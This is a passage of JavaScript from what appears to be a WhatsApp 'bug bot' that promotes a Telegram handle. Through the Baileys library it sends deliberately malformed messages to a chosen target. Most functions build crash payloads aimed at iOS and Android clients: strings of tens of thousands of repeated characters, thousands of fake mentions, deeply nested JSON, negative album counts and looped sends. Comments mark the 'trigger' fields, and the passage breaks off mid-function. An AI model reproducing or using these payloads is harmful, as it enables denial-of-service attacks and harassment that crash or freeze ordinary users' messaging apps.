        degreesLongitude: 'Telegram: @B_o_d_a1FR',
        name: `Telegram: @B_o_d_a1FR`,
        url: bugUrl,
        contextInfo: {
          forwardingScore: 508,
          isForwarded: true,
          isLiveLocation: true,
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: sender,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              title: "crash",
              pageCount: 1000000000,
              fileName: "crash.pdf",
              contactVcard: true
            }
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363274419284848@newsletter',
            serverMessageId: 1,
            newsletterName: " " + bug + bug
          },
          externalAdReply: {
            title: ' Telegram: @B_o_d_a1FR ',
            body: 'Telegram: @B_o_d_a1FR',
            mediaType: 0,
            thumbnail: rajaXeon,
            jpegThumbnail: rajaXeon,
            mediaUrl: `https://www.youtube.com/@ `,
            sourceUrl: `https://www.youtube.com/@ `
          }
        }
      }
    },
    {
      participant: {
        jid: isTarget
      }
    },
    {
      messageId: null
    }
);
	
	}

async function forcergp(isTarget){
	const rajaXeon = {
  key: {
    remoteJid: '120363401744741900@g.us',
    fromMe: true,
    id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
    participant: '201507151697@s.whatsapp.net'
  },
  messageTimestamp: 1753786706,
  pushName: 'Telegram: @B_o_d_a1FR',
  broadcast: false,
  status: 2,
  message: {
    conversation: 'Telegram: @B_o_d_a1FR',
    messageContextInfo: {
      messageSecret: new Uint8Array([
        123, 153, 59, 66, 69, 1, 31, 219,
        233, 201, 204, 107, 149, 77, 233, 100,
        80, 15, 30, 192, 133, 13, 171, 48,
        44, 27, 61, 135, 73, 149, 172, 105
      ])
    }
  },
  id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
  isBaileys: false,
  chat: '120363401744741900@g.us',
  fromMe: true,
  isGroup: true,
  sender: '201507151697@s.whatsapp.net',
  participant: '201507151697@s.whatsapp.net',
  mtype: 'conversation',
  msg: 'Telegram: @B_o_d_a1FR',
  body: 'Telegram: @B_o_d_a1FR',
  quoted: null,
  mentionedJid: [],
  text: 'Telegram: @B_o_d_a1FR',
  reply: function() {}, // Placeholder for function
  copy: function() {}, // Placeholder for function
  copyNForward: function() {} // Placeholder for function
};
	await XeonBotInc.relayMessage(
    isTarget,
    {
      locationMessage: {
        degreesLatitude: 'Telegram: @B_o_d_a1FR',
        degreesLongitude: 'Telegram: @B_o_d_a1FR',
        name: `Telegram: @B_o_d_a1FR`,
        url: bugUrl,
        contextInfo: {
          forwardingScore: 508,
          isForwarded: true,
          isLiveLocation: true,
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: sender,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              title: "crash",
              pageCount: 1000000000,
              fileName: "crash.pdf",
              contactVcard: true
            }
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363274419284848@newsletter',
            serverMessageId: 1,
            newsletterName: " " + bug + bug
          },
          externalAdReply: {
            title: ' Telegram: @B_o_d_a1FR ',
            body: 'Telegram: @B_o_d_a1FR',
            mediaType: 0,
            thumbnail: rajaXeon,
            jpegThumbnail: rajaXeon,
            mediaUrl: `https://www.youtube.com/@ `,
            sourceUrl: `https://www.youtube.com/@ `
          }
        }
      }
    },
    {
      messageId: null
    }
);
	
	}
//==============================================================\\
async function xiosinv(target){
tmsg = await generateWAMessageFromContent(target, {
               viewOnceMessage: {
                   message: {
                       listResponseMessage: {
                           title: '@B_o_d_a1FR\n',
                           description:"\n\n\n"+"𑪆".repeat(260000),
                           singleSelectReply: {
                               selectedId: "id"
                           },
                           listType: 1
                       }
                   }
               }
       }, {});

       await XeonBotInc.relayMessage("status@broadcast", tmsg.message, {
           messageId: tmsg.key.id,
           statusJidList: [target],
           additionalNodes: [{
               tag: "meta",
               attrs: {},
               content: [{
                   tag: "mentioned_users",
                   attrs: {},
                   content: [{
                       tag: "to",
                       attrs: { jid: target },
                       content: undefined,
                   }],
               }],
           }],
       });
       }
//==============================================================\\
async function xeonAndroSpamGp(targetNumber){
   let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "ꦾ".repeat(9000),
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
            ],
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
          },
        },
      },
    },
  };
  await XeonBotInc.relayMessage(targetNumber, message, {
      messageId: null,
      userJid: targetNumber,
    });
    }
  
  async function xeonSpamDroid2(target){
  	let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "Telegram: @B_o_d_a1FR",
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
              ],
              messageParamsJson: "[{".repeat(10000),
            },
          },
        },
      },
    };
    
    await XeonBotInc.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
    }

async function IosNew(Jids) {
await XeonBotInc.relayMessage(Jids, {
					extendedTextMessage: {
						text: "destructor ios - ( yukina Devils  )\n" + "".repeat(250000),
						contextInfo: {
							mentionedJid: "628953008888@s.whatsapp.net", ...Array.from({ length: 15000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
							stanzaId: "1234567890ABCDEF",
                            participant: Jids,
                            conversionDelaySeconds: 45,
							forwardingScore: 99,
							isForwarded: true,
							quotedAd: {
							advertiserName: "bug fucx your mother",
							caption: "\u0000",
							mediaType: "IMAGE",
							jpegThumbnail: null,
							},
							externalAdReply: {
								title: "trash ios new" + "".repeat(100),
								body: "Fail Beta - ( coresix )" + "".repeat(20),
								mediaType: "IMAGE",
								renderLargerThumbnail: true,
								previewType: "IMAGE",
								thumbnail: null,
								sourceType: "message",
								sourceId: "762",
								sourceUrl: "t.me/mulzyapocalypse",
								mediaUrl: "https://t.me/Notfound_Comander",
								containsAutoReply: true,
								showAdAttribution: true,
							},
							disappearingMode: {
								initiator: 'INITIATED_BY_ME'
								},
								placeholderKey: {
						remoteJid: "0@s.whatsapp.net",
						fromMe: false,
						id: "0"
					}}}}, {
					participant: {
						jid: Jids
					}});
		};
//==============================================================\\

const { xeonKingIos } = require('./69/xKingIos.js');
async function xeonSpamIos(target){
	const msg = {
    "viewOnceMessage": {
      "message": {
        "listResponseMessage": {
          "title": "Telegram: @B_o_d_a1FR",
          "listType": "SINGLE_SELECT",
          "singleSelectReply": {},
          "description": xeonKingIos
        }
      }
    }
  };
  const allmsg = generateWAMessageFromContent(target, proto.Message.fromObject(msg), {});
  XeonBotInc.relayMessage(target, allmsg.message, { messageId: allmsg.key.sender });
	}
//==============================================================\\
async function xeonBetaAI(isTarget) {
  const cards = [];

  /*const media = await prepareWAMessageMedia(
  { video: fs.readFileSync('./XeonMedia/Cheems-bot.mp4') },
  { upload: XeonBotInc.waUploadToServer }
);*/

const media = {
      videoMessage: {
        url: 'https://mmg.whatsapp.net/v/t62.7161-24/11902728_707998228510266_7829645663280785822_n.enc?ccb=11-4&oh=01_Q5Aa1wEL8L0ZvwfyQEAl0Ujqn4yUqRi7NLYBclROwMXxB-wiBA&oe=68882423&_nc_sid=5e03e0&mms3=true',
        mimetype: 'video/mp4',
        fileSha256: Buffer.from('j0yv4uuRPfX3ZOfyZ0t8irS7K+MluEOyodghganzbJY=', 'base64'),
        fileLength: '2359888',
        mediaKey: Buffer.from('ld+SoEzJXiVsVakuPuyRWrJfWfvJJYa0CnooCPDdZWo=', 'base64'),
        fileEncSha256: Buffer.from('kibztIx3/O30AIs++tSPOZEIo/S7a6IpBO99d9ycNYk=', 'base64'),
        directPath: '/v/t62.7161-24/11902728_707998228510266_7829645663280785822_n.enc?ccb=11-4&oh=01_Q5Aa1wEL8L0ZvwfyQEAl0Ujqn4yUqRi7NLYBclROwMXxB-wiBA&oe=68882423&_nc_sid=5e03e0',
        mediaKeyTimestamp: '1751161073',
        jpegThumbnail: Buffer.from(
          '/9j//gAQTGF2YzYxLjE5LjEwMQD/2wBDAAgGBgcGBwgICAgICAkJCQoKCgkJCQkKCgoKCgoMDAwKCgoKCgoKDAwMDA0ODQ0NDA0ODg8PDxISEREVFRUZGR//xABxAAEBAQEBAQAAAAAAAAAAAAAHBgAIBAUBAQEBAQAAAAAAAAAAAAAAAAIAAwEQAAIBAwMDAwQDAQAAAAAAAAECAwUEERIABjEHEyIhFCNiUXFhFYEyEQADAQACAwEAAAAAAAAAAAAAAQIRQTEDcRIh/8AAEQgAGAAgAwEiAAIRAAMRAP/aAAwDAQACEQMRAD8Am+0/bShc1pl7eVKS9V4LkRKLeWONdOgNk6onJP8Au71exHCXzieq+xx73MSg/otbDP7GdmnbfkFdpNtFa0/5a2t1dSedrS1SaXyrGvjXXIjqgIz0w342k3vE63UQJJreoSkhmBkkHkd3C4dw8mA2lceoYGeg2HecN+jSPF9rXUz12fDq/bPtzSsJJe36yuzrGj30BZygLMRHHbvJpABJdgifds65VQ+NWFKt7ilyVA3jTnypOPoLA2QgVzGjNIMAt09m6dNolr2j5J8j57myhZ5B9KaSQskbN6lJRGLEr6SScYLE/jc33N4ZV+P02Go1G7iuPlzLHoQyeiT1SHSrKiJGR0VR/J9ztJt8BqZnf3Tz9uea8a4/S7izrK1PyG6M8T2QTThogh1ZkU5BGQCCN2q91+BxRXSRPyKM3WjW5jifTolEg8atNoXJGCAMEEjG+fN7fQj7F3T4VC10EueQiO4gjjANvA0kbJMJWcEz6DqwFwU/59jnch3F5rxuvUuKzo39ozm7W4la+VAoCxsuIyJXxktnSFA2Y724j//Z',
          'base64'
        )
      }
    };

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "Telegram: @B_o_d_a1FR" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "Telegram: @B_o_d_a1FR",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "Telegram: @B_o_d_a1FR",
              body: "Telegram: @B_o_d_a1FR",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://tama.example.com",
              showAdAttribution: false // trigger 1
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) // trigger 2
      }
    });
  }

  const msg = generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "Telegram: @B_o_d_a1FR"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "Telegram: @B_o_d_a1FR" + "Telegram: @B_o_d_a1FR" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
              externalAdReply: {
                title: "Telegram: @B_o_d_a1FR",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await XeonBotInc.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
}
//==============================================================\\
const IosCrashByRXHL = async (X) => {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "RxhlOfc" + "𑇂𑆵𑆴𑆿".repeat(15000),
         address: "RxhlOfc" + "𑇂𑆵𑆴𑆿".repeat(5000),
         url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = await generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "馃懆馃徔鈥嶐煃� 饾樋谭饾櫄饾櫕饾櫎饾櫑饾櫒谭饾櫈饾櫗饾櫂饾櫎饾櫑饾櫄谭_,-,_ 馃И饾棓谭饾椈饾棻 #谭 饾棪谭饾椀饾椉饾槃饾棦谭饾棾饾棔饾槀饾棿谭 @饾棝谭饾棶饾椊饾暋饾槅饾棖谭饾椉饾椇饾櫌饾槀饾椈饾椂饾榿饾櫘 馃檲\n\n# _ - https://t.me/rxhlvro - _ #",
            matchedText: "https://t.me/rxhlvro",
            description: "鈥硷笍RXHLOFC鈥硷笍" + "饝噦饝喌饝喆饝喛".repeat(15000),
            title: "鈥硷笍RXHLOFC鈥硷笍" + "饝噦饝喌饝喆饝喛".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = await generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await XeonBotInc.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [X],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: X
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await XeonBotInc.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [X],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: X
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};

//==============================================================\\


    
    async function iosLx(target) {
  for(let z = 0; z < 100; z++) {
    await XeonBotInc.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: 21.1266,
            degreesLongitude: -11.8199,
            name: `🧪⃟꙰。⌁𝟕𝐞𝐩 𝐩𝐞𝐥 ⃰𝐢. - 𝐄𝐱𝐩𝐨𝐬𝐞𝐝` + "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/Notfound_Comander",
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`), 
              externalAdReply: {
                quotedAd: {
                  advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                  mediaType: "IMAGE",
                  jpegThumbnail: ZeppImg, 
                  caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                },
                placeholderKey: {
                  remoteJid: "0s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
                }
              }
            }
          }
        }
      }
    },{ participant: { jid:target } });
    await sleep(9000);
  }
}
    
    
    async function chatFrezze(target) {
const fakeKey = {
    "remoteJid": target,
    "fromMe": true,
    "id": await XeonBotInc.relayMessage(target, {
        "albumMessage": {
            "expectedImageCount": -99999999,
            "expectedVideoCount": 0,
            "caption": "x"
        }
    },{participant:{jid:target}})
}
let xx = {"url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQN0oZNr6-kfN5YWoC1cdu2hEJ4VBgXpp41NeQkRtkVb2lDTyjBL4J8yMMfYgJ0YWZRgZdiUzCqAV5EYTeq7FcaysmAPj53twFH-dr0e4Q?ccb=9-4&oh=01_Q5Aa2AEnGl7IbMFtdCLGyFb8_d08Q7WVgIUC193324MQoouEiA&oe=68A159D3&_nc_sid=e6ed6c&mms3=true","mimetype": "image/jpeg","fileSha256": "l5PXVvy1P0tnS0y8+eg0AwS4og/GLOuSW0OI/ZDgZEE=","fileLength": "367077","height": 1395,"width": 1200,"mediaKey": "rTYEhP0o5UbHDasXyfvpsAgXsh3SNnsPQKzoPKQ50gw=","fileEncSha256": "6tK2h/KEpqgW5W5Qx9SnmBhZpSs4Y6V2Ac7UoDjdSvY=","directPath": "/o1/v/t24/f2/m238/AQN0oZNr6-kfN5YWoC1cdu2hEJ4VBgXpp41NeQkRtkVb2lDTyjBL4J8yMMfYgJ0YWZRgZdiUzCqAV5EYTeq7FcaysmAPj53twFH-dr0e4Q?ccb=9-4&oh=01_Q5Aa2AEnGl7IbMFtdCLGyFb8_d08Q7WVgIUC193324MQoouEiA&oe=68A159D3&_nc_sid=e6ed6c"}
for (let s = 0; s < 2; s++) {
const xy = generateWAMessageFromContent(target, proto.Message.fromObject({
"botInvokeMessage": {
"message": {
    "messageContextInfo": {
        "messageSecret": (0, crypto.randomBytes)(32),
        "messageAssociation": {
            "associationType": "MEDIA_ALBUM",
            "parentMessageKey": fakeKey
        }
    },
"imageMessage": xx
}
}
}),{participant:{jid:target}})
const xz = await XeonBotInc.relayMessage(target, xy.message, {messageId:xy.key.id,participant:{jid:target}})
xx.caption = "𑲱".repeat(100000);
XeonBotInc.relayMessage(target, {
"protocolMessage": {
    "type": "MESSAGE_EDIT",
    "key": {
        "fromMe": true,
        "remoteJid": target,
        "id": xz
    },
    "editedMessage": {
        "imageMessage": xx
    }
}
},{participant:{jid:target}})
await sleep(100)
}
}

//==============================================================\\
async function groupBlank(target) {
  XeonBotInc.relayMessage(target, {
    newsletterAdminInviteMessage: {
      newsletterJid: "13135550002@newsletter",
      newsletterName: "᭡꧈".repeat(100000),
      caption: "p" + "\u0000".repeat(10000),
      inviteExpiration: "0",
    },
  }, {
    participant: { jid: target }
  })
  
  console.log("Succes Send")
}
//==============================================================\\
async function guatrainvi(target, mention) {

  const imageCrash = "https://files.catbox.moe/8c1rds.jpg";

  const mentionedMetaAi = [
    "13135550001@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net"
  ];

  const photo = {
    image: { url: imageCrash },
    caption: "GMOTEJID     >  @w@'" 
             + "\n".repeat(5)
             + "ꦾ".repeat(60000)
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, {
    userJid: target,
    upload: XeonBotInc.waUploadToServer
  });

  await XeonBotInc.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) {
    const msg = await generateWAMessage(target, photo, {
      upload: XeonBotInc.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
        ...mentionedMetaAi,
        ...Array.from({ length: 30000 }, () =>
          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      businessMessageForwardInfo: {
        businessOwnerJid: "13135550002@s.whatsapp.net"
      },
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "ꦾ".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 999
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };
   msg.message.nativeFlowMessage = {
  buttons: [
    {
      name: "single_select",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    },
    {
      name: "call_permission_request",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    },
    ...Array(99999).fill().map(() => ({
      name: "mpm",
      buttonParamsJson: "",
    })),
  ],
  messageParamsJson: "[{".repeat(10000),
};
    await XeonBotInc.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
